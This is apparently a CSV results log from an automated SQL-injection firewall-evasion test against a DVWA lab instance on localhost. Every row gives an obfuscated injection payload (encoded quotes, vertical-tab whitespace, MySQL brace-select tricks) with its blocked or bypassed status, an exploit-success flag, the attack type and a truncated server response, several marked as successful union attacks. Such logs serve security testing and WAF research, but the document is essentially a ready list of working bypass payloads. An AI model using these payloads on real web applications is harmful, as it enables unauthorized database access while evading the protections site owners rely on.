Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@!=1%0bor+not+{a+1}=1=+(not~false)+or',Bypassed,No,None,booleanAtk,0.0313,70.59,No,500,
0'<@!=1.+or+not%7efalse=+(not+{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,booleanAtk,0.0316,70.59,No,500,
0%27<@=1%0bor+!%0b{x%0b(select%0b1)}=1=+(!%0b{`if`+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0313,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0b||%0bnot%0b{`if`%0b1}=1=%0b(!+{x%0b(select+1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0178,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0b||%0bnot+1=+(not+{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0195,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0b||+not%0b1%0bis%0bfalse%0b||',Bypassed,No,None,Unknown,0.0293,70.59,No,500,
0%27<@=.1+or+false=+(not%0b1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0243,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or+not+{`if`+1}=1=+(not+{x%0b(select+1)}=1)%0b,Bypassed,No,None,Unknown,0.0121,70.59,No,500,
0%27<@=1%0b||+!~false=+(!%7e0)+||',Bypassed,No,None,Unknown,0.0187,70.59,No,500,
0%27<@!=.1+||%0b!%0b{x+(select%0b1)}=1=+(!+{x+(select+1)}=1),Blocked,No,None,Unknown,0.0161,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0b||+not%0b{a+1}=1=+(not+true)+or',Bypassed,No,None,booleanAtk,0.0219,70.59,No,500,
0%27or%0b@<@.%0b||+not%0b{`if`%0b1}=1=%0b(not+1)+or',Bypassed,No,None,Unknown,0.0264,70.59,No,500,
0%27<@=1.+or%0b!%0b{a%0b1}=1=+(!+1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0184,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||+not+1=%0b(!%0btrue)+||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0338,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+{`if`%0b1}=1+like+true%0b||',Bypassed,No,None,Unknown,0.0255,70.59,No,500,
0'<@!=1+||%0b!%0b{x+(select+1)}=1=%0b(0)+||',Blocked,No,None,Unknown,0.0227,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1%0b||+not%0b{x%0b(select+1)}=1=+(!%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0156,70.59,No,500,
0'||%0b1<@.+or+1%0blike%0b{`if`%0b1}=1+||%27,Bypassed,No,None,Unknown,0.0182,70.59,No,500,
0'<@!=1+||+not+{x%0b(select%0b1)}=1=+(not+{a+1}=1)%0b,Bypassed,No,None,Unknown,0.0117,70.59,No,500,
0%27<@!=1.+||+!+{x%0b(select+1)}=1=+(not%0b{a%0b1}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0137,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0b||%0b{`if`+1}=1%0blike+{x%0b(select%0b1)}=1+or',Bypassed,No,None,Unknown,0.0238,70.59,No,500,
0%27<@=1%0bor%0b!+{`if`%0b1}=1=%0b(not+{x%0b(select%0b1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0254,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||+!%0b{x+(select+1)}=1=+(!+{a%0b1}=1)--,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0211,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+!%0b{x%0b(select+1)}=1=+(!%0b{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0236,70.59,No,500,
0'<@=.1%0b||%0b!%0b{x%0b(select+1)}=1=%0b(!+{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0272,70.59,No,500,
0'<@=1.+or+not%0b{x%0b(select+1)}=1=%0b(!+true)+||%27,Bypassed,No,None,booleanAtk,0.0337,70.59,No,500,
0'<@!=1%0b||+!%0b{x%0b(select+1)}=1=%0b(not%0btrue)%0bor',Bypassed,No,None,booleanAtk,0.0334,70.59,No,500,
0%27<@!=1.%0bor+!+{x%0b(select+1)}=1=+(not%0b{a+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0306,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||+{a%0b1}=1%0blike%0b{`if`+1}=1+or%27,Bypassed,No,None,Unknown,0.0116,70.59,No,500,
0%27<@=.1%0bor%0b!~false=+(!+{x%0b(select%0b1)}=1)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0228,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+!+{x+(select+1)}=1=%0b(!%7efalse)+||',Blocked,No,None,Unknown,0.0106,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+||%0b{x+(select+1)}=1%0blike+{x+(select+1)}=1+||',Bypassed,No,None,Unknown,0.0355,70.59,No,500,
0%27<@=1+or%0bnot%0b{x+(select+1)}=1=+(not+{a%0b1}=1)--,Blocked,No,None,piggyAtk,0.0173,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or+!%7efalse=+(!+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,booleanAtk,0.0113,70.59,No,500,
0%27<@!=1+||+not%0b{`if`%0b1}=1=+(0)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0348,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0b!%7efalse=+(not%0b{x+(select+1)}=1)+or',Bypassed,No,None,booleanAtk,0.0324,70.82,No,500,
0'<@!=1.+or+not%0b{x+(select+1)}=1=%0b(false)+||%27,Bypassed,No,None,booleanAtk,0.019,70.82,No,500,
0%27<@=.1+or%0b!+{x+(select%0b1)}=1=+(not~false)+or%27,Blocked,No,None,booleanAtk,0.0087,70.82,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+||+{a%0b1}=1%0blike+{x%0b(select+1)}=1+or',Bypassed,No,None,Unknown,0.0463,69.97,No,500,
0'<@=1+or+!%0b{a%0b1}=1=%0b(not+{a+1}=1)%23,Blocked,No,None,piggyAtk,0.0178,70.17,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+||+not%0b{x%0b(select%0b1)}=1=+(!%0b{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0302,70.17,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or%0bnot+{`if`%0b1}=1=+(!%0b{x%0b(select%0b1)}=1)%0b,Bypassed,No,None,Unknown,0.017,70.17,No,500,
0'<@=1.+||+{a+1}=1+like+{a+1}=1+or',Bypassed,No,None,Unknown,0.0233,70.17,No,500,
0%27or+@<@.%0b||%0bnot%0b{x+(select%0b1)}=1=%0b(!+{x+(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.017,70.17,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||%0b!+{`if`+1}=1=%0b(not+{x+(select%0b1)}=1)--,Bypassed,No,None,piggyAtk,0.0262,70.38,No,500,
0%27<@!=.1%0b||%0b!%0b{x%0b(select+1)}=1=+(!+{a%0b1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0378,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+not+{x%0b(select+1)}=1=+(not%0b{x%0b(select+1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0292,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||+not~0=+(not%0b1)+||',Bypassed,No,None,Unknown,0.0274,70.59,No,500,
0%27<@!=.1+or%0b!%0b{x+(select+1)}=1=%0b(not%0b{x%0b(select%0b1)}=1),Blocked,No,None,Unknown,0.0178,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.%0bor+not%0b{a%0b1}=1=%0b(not+{x%0b(select+1)}=1)+,Bypassed,No,None,Unknown,0.0354,70.59,No,500,
0%27<@=.1%0b||%0b!+{`if`+1}=1=%0b(!+{a%0b1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0208,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||%0bnot%0b{a+1}=1=+(not%7efalse)%0b||',Bypassed,No,None,Unknown,0.0222,70.59,No,500,
0%27<@!=.1%0bor%0b!%0b1=%0b(!+{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0187,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||%0b!%0b{`if`+1}=1=%0b(!%0b{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0482,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0b||+!+{x+(select+1)}=1=+(not+{`if`+1}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0151,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0b!+{`if`%0b1}=1=+(not+{a%0b1}=1)%0bor%27,Bypassed,No,None,Unknown,0.0273,70.59,No,500,
0%27<@!=.1%0bor%0bnot%0b{x%0b(select%0b1)}=1=+(!%7efalse)+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0279,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||%0bnot%7efalse=%0b(not+{a%0b1}=1)--%0b,Blocked,No,None,piggyAtk,0.0128,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+||+!+{x+(select+1)}=1=%0b(false)%0b||',Blocked,No,None,Unknown,0.0142,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or%0bnot+{`if`%0b1}=1=+(not+{`if`+1}=1)+||',Bypassed,No,None,Unknown,0.036,70.59,No,500,
0'<@=.1+||+!%0b{x%0b(select%0b1)}=1=+(!+{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0332,70.59,No,500,
0%27<@=1.%0bor%0bnot%0b{a+1}=1=+(not+{x+(select+1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0223,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor%0b!%0b{a%0b1}=1=%0b(!%0b{a%0b1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Unknown,0.0296,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+!+{x+(select+1)}=1=%0b(not+{a%0b1}=1)+,Blocked,No,None,Unknown,0.0201,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0bor%0bnot%0b{x%0b(select%0b1)}=1=%0b(not+{a%0b1}=1)%0b,Bypassed,No,None,Unknown,0.026,70.59,No,500,
0%27<@=1+||%0b{a+1}=1+like+1%0bor',Blocked,No,None,Unknown,0.0205,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.%0b||%0b!+{a+1}=1=%0b(not+{x+(select%0b1)}=1)%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0234,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor+not+{x%0b(select%0b1)}=1=%0b(not%0b{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0192,70.59,No,500,
0'<@!=1.+||%0bnot+{x%0b(select%0b1)}=1=+(not%0b{x+(select%0b1)}=1),Bypassed,No,None,Unknown,0.0226,70.59,No,500,
0'<@!=1%0b||+not+{x%0b(select%0b1)}=1=+(not+true)%0b||',Bypassed,No,None,Unknown,0.0227,70.59,No,500,
0%27<@!=1%0bor+not%0b{a+1}=1=%0b(not+{x%0b(select%0b1)}=1)+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0318,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor+not+{x%0b(select+1)}=1=%0b(false)%0b||%27,Bypassed,No,None,booleanAtk,0.0334,70.59,No,500,
0'<@!=.1+or+not%7e0=+(!+true)+||%27,Blocked,No,None,booleanAtk,0.0234,70.59,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0b||+!%0b{x+(select+1)}=1=+(false)%23,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.02,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||%0bnot+{x%0b(select+1)}=1=%0b(!+{a+1}=1)--,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0272,70.59,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
